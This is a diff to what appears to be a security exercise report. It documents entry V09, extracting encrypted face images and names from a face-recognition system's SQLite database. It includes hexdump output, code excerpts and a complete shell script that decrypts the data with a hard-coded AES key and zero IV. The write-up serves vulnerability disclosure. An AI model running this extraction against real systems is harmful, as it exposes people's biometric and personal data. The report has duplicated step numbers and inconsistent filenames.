@@ -513,10 +513,116 @@ V08) Memory leakeage in the 'get_a_packet' function
 				...
 			}
 
-V09)
+V09) Extraction of face image data and name used by the face recog. AI engine
 	Compromise Sequence
+		1. Find AES key from file which has name "secret.key"
+		2. Extract data from tartan_face.db
+		3. Decrypt data, Encode data appropriately
+		4. We can find someone's face image (maybe one of Team1's member), and name (test)
 
 	Vulnerabilities
-		V09-1.
+		V09-1. Storing password in an easy-to-find place and reuse an initial vector make it easy to decrypt Private Persoanl Infomation in database.
+			CWE-257: Storing Passwords in a Recoverable Format https://cwe.mitre.org/data/definitions/257.html
+			CWE-323: Reusing a Nonce, Key Pair in Encryption https://cwe.mitre.org/data/definitions/323.html
+			CWE-321: Use of Hard-coded Cryptographic Key https://cwe.mitre.org/data/definitions/321.html
+			CWE-200: Exposure of Sensitive Information to an Unauthorized Actor https://cwe.mitre.org/data/definitions/200.html
+			CWE-359: Exposure of Private Personal Information to an Unauthorized Actor https://cwe.mitre.org/data/definitions/359.html
 
 	Approach
+		1. Find 16byte data in /var/shinpark/secret.key which is guessed as the KEY used for AES encryption
+			$ hexdump secret.key
+			0000000 3412 7856 bc9a f0de 5634 9a78 debc 12f0
+
+			$ hexdump -e '16/1 "%02x"' /var/shinpark/secret.key
+			123456789abcdef03456789abcdef012
+
+		2. By examining the code related to cipher,
+			2-1. we confirme that secret.key is used for cipher
+				#define SECRET_KEY_FILE "/var/shinpark/secret.key"
+			    fi.open( SECRET_KEY_FILE, std::ios_base::in | std::ios_base::binary);
+        		fi.read((char*)secret_key,IV_SIZE);
+
+			2-2. AES128 (16byte key length) cipher with CBC mode is used
+			2-3. We found that IV(initial vector) values are 16bytes with all 00's
+				string CCyper::encrypt_aes(const string instr)
+				{
+					string outstr;
+					memset(iv, 0, sizeof(iv)); // init iv
+					...
+					int ret=AES_set_encrypt_key(secret_key, KEY_BIT, &aes_ks3);
+					...
+					AES_cbc_encrypt((unsigned char*)instr.c_str(), outbuf, len, &aes_ks3, iv, AES_ENCRYPT);
+					...
+					return  outstr;
+				}
+
+		3. Check tartan_face.db
+			3-1. find encrypted data from name field of names table
+				$ sqlite3 tartan_faces.db
+
+				sqlite> .tables
+				faces  names
+				sqlite> .schema names
+				CREATE TABLE names (id INTEGER PRIMARY KEY AUTOINCREMENT , name TEXT );
+
+			3-2. find encrypted data from face field of faces table
+				sqlite> .schema faces
+				CREATE TABLE faces (id INTEGER PRIMARY KEY AUTOINCREMENT , names_id INT, face BLOB );
+
+		4. Extract encrypted name data (hexstring of 32 length) and face data (blob, All blob's size is fixed - 921,624byte) from tartan_user.db
+		5. Decrypt name data and face data, using shell script,
+			# get cipher KEY and IV
+			AES_ROOT_KEY=$(hexdump -e '16/1 "%02x"' /var/shinpark/secret.key)
+			IV_VALUE='00000000000000000000000000000000'
+
+			FACE_DB_PATH=/usr/local/tartan/tartan_faces.db
+
+			# extract name data
+			SQL_STRING="select (name) from names where id="${1}
+			NAME_STRING=$(sqlite3 ${FACE_DB_PATH} "${SQL_STRING}")
+			echo -n ${NAME_STRING} | xxd -r -p > name${1}
+
+			# decrypt name data
+			openssl enc -aes-128-cbc -d -in name${1} -out name${1}.dec\
+				-K ${AES_ROOT_KEY}\
+				-iv ${IV_VALUE}\
+				-nosalt -nopad
+
+			# extract face data
+			SQL_STRING="select writefile('blob.bin', face) from faces where id="${1}
+			sqlite3 ${FACE_DB_PATH} "${SQL_STRING}"
+
+			# just eliminate first 16byte, it's for size variables
+			mv blob.bin blob${1}.bin
+			dd bs=16 skip=1 if=blob${1}.bin of=blob${1}.mod
+			truncate -s -8 blob${1}.mod
+
+			# decrypt face data
+			openssl enc -aes-128-cbc -d -in blob${1}.mod -out blob${1}.dec\
+				-K ${AES_ROOT_KEY}\
+				-iv ${IV_VALUE}\
+				-nosalt -nopad
+
+		4. Encode face data to JPG format using OpenCV library
+			4-1. We can know data is cv::Mat raw data type, from code review
+			4-2. Create coverter executable (dbDecToJPG) using OpenCV library
+				err = load_file(filename, &buf, &size);
+				...
+				cv::Mat image = cv::Mat(videoFrameHeight, videoFrameWidth, 16);
+				image.data = buf;
+
+				std::vector<uchar> pic_buf;
+				cv::imencode(".jpg", image, pic_buf);
+
+				err = save_file("./result.jpg", pic_buf.data(), pic_buf.size());
+				...
+
+		5. Open with image Viewer, and we can find someone's face image (maybe one of Team1's member), and name (test)
+
+V10)
+Compromise Sequence
+
+Vulnerabilities
+	V09-1.
+
+Approach
